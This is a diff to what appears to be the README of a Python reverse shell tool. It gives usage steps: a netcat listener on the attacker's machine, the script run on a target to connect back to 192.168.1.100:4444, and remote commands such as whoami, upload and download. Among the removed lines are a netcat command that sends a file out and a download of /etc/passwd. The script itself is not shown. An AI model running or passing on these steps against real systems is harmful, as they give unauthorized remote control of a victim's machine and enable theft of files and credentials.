@@ -26,10 +26,30 @@ On the attacker's machine, set up a listener to receive the reverse shell connec
 
 ```sh
 python3 reverse_shell.py
-python3 reverse_shell.py -h
-python3 reverse_shell.py <TARGET_IP> <TARGET_PORT>
+python3 reverse_shell.py <target_ip> <target_port>
+nc -lvp <target_port>
 whoami
-cd /etc
-upload test.txt
-cat test.txt | nc -w 3 YOUR_TARGET_IP YOUR_PORT
-download /etc/passwd
+user
+upload example.txt
+download example.txt
+cd /tmp
+exit
+
+## Example Interaction
+1. Attacker's Machine:
+
+Set up the listener:
+nc -lvp 4444
+2. Target Machine:
+
+Run the script:
+python3 reverse_shell.py 192.168.1.100 4444
+
+3. Attacker's Machine:
+
+Send a command:
+whoami
+
+Receive the output:
+user
+
